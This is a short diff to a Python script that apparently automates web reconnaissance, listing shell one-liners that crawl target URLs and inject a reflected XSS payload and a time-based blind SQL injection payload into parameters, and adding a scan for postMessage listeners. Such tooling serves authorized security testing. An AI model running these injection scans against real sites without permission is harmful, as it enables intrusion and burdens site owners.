@@ -50,6 +50,7 @@ def main():
         {'cmd': f'httpx -l parameters.txt -silent -no-color -threads 300 -location 301,302 | awk \'{{print $2}}\' | grep -Eo "(http|https)://[^/\"]*" | tr -d \'[]\' | parallel -j50 "gospider -d 0 -s {{}}" | tr \' \' \'\\n\' | grep -Eo \'(http|https)://[^/\"]*\' | grep "=" | qsreplace "<svg onload=alert(1)>";', 'type': 'XSS Check'},
         {'cmd': f'cat parameters.txt| grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt', 'type': 'Blind SQL Injection Scan'},
         {'cmd': f'cat blindsqli.txt| parallel -j50 -q curl -o /dev/null -s -w %{{6}}\\n', 'type': 'Blind SQL Injection Scan 2'},
+        {'cmd': f'cat parameters.txt | getJS | httpx --match-regex "addEventListener\((?:\'|\")message(?:\'|\")" -silent', 'type': 'XSS Scan'},
         {'cmd': f'nuclei -l parameters.txt -t fuzzing-templates -o FUZZReport.txt', 'type': 'Fuzzing Check'},
         {'cmd': f'cat subs.txt | httpx -threads 50 -silent -o httpx_results.txt', 'type': 'HTTP Scan 2'},
         {'cmd': f'cat httpx_results.txt | nuclei -t nuclei-templates -o WebReport.txt', 'type': 'Web Check'},
